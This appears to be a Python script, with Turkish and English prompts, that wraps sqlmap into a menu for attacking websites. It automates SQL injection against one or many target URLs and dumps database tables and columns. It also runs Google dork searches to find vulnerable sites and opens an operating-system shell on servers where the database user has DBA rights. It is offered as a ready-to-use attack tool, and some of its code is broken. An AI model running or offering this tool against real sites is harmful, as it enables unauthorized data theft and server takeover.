import os


print("""
--------------------------------------
--------------------------------------
------SqlMap Otomatik Kullanım--------
----------1.Sql Attack----------------
----------2.Multi Sql Attack----------
----------3.Dork Scan-----------------
----------4.Shell Upload--------------
--------------Agartha-----------------
--------------------------------------
""")
secim = input(" ")
if secim == "1":
    os.chdir("SqlMap")
    site = input("Site Adını Giriniz: /Add Site Name: ")
    os.system("python sqlmap.py -u " + site +
              " --risk=3 --level=5 --random-agent --answers= y  --user-agent -v3 --batch --threads=10 --dbs")
    database = input("Database Adını Giriniz: /Add Database Name: ")
    os.system("python sqlmap.py -u " + site +
              " --risk=3 --level=5 --random-agent --answers= y --user-agent -v3 --batch --threads=10 -D "+database+" --tables")
    tablo = input("Tablo Adını Giriniz: /Add Table Name: ")
    os.system("python sqlmap.py -u " + site +
              " --risk=3 --level=5 --random-agent --answers= y --user-agent -v3 --batch --threads=10 -D "+database+" -T"+tablo+" --columns")
    kolon = input("Kolon Adlarını Giriniz: /Add Columns Name: ")
    os.system("python sqlmap.py -u " + site+" --risk=3 --level=5 --random-agent --answers= y --user-agent -v3 --batch --threads=10 -D " +
              database+" -T"+tablo+" -C"+kolon+" --dump")

if secim == "2":
    dosya = open("site.txt", "r")
    for satir in dosya:
        print(satir+"  Başladı/Starting....")
        os.chdir("SqlMap")
        os.system("python sqlmap.py -u " + satir +
                  " --risk=3 --level=5 --random-agent --answers= y --batch --user-agent -v3 --batch --threads=10 --dbs")
        database = input("Database Adını Giriniz: /Add Database Name: ")
        os.system("python sqlmap.py -u " + satir +
                  " --risk=3 --level=5 --random-agent --answers= y --user-agent -v3 --batch --threads=10 -D "+database+" --tables")
        tablo = input("Tablo Adını Giriniz: Table Name: ")
        os.system("python sqlmap.py -u " + satir +
                  " --risk=3 --level=5 --random-agent  --answers= y --user-agent -v3 --batch --threads=10 -D "+database+" -T"+tablo+" --columns")
        kolon = input("Kolon Adlarını Giriniz: /Add Columns Name: ")
        os.system("python sqlmap.py -u " + satir+" --risk=3 --level=5 --random-agent --answers= y --user-agent -v3 --batch --threads=10 -D " +
                  database+" -T"+tablo+" -C"+kolon+" --dump")
if secim == "3":
    secDork = input("""Manuel Dork İçin 1
    Ya da Otomatik İçin 2 seçin: 
    /Manuel Searching Input 1 or Manuel Searchig
    Input 2""")
    if secDork == "1":
        os.chdir("SqlMap")
        dork = input("Dork  Giriniz:/ Add Dork ")
        os.system("python sqlmap.py -g "+dork)
        print("İŞLEM TAMAM")
    if secDork == "2":
        os.chdir("SqlMap")
        dosya = open("dork.txt", "r")
        for satir in dork:
            os.system("python sqlmap.py -g "+satir)
            print("Diğer Dorka Geçiliyor.../Processing In Progress...")

if secim == "4":
    os.chdir("SqlMap")
    site = input("Site Adını Giriniz:/ Add Sites Url ")
    print(""" BU MODÜL SHELL ATABİLECEĞİNİZ
    YOLU GÖSTERİR EĞER current is dba: True
    HATASI ALIR İSENİZ SHELL ATACAK YOL AÇILMIŞTIR""")
    os.system("python sqlmap.py -u "+site+" --current-user --is-dba")
    os.system("python sqlmap.py -u "+site+" --os-shell")
    print("İşlem Bitti...")
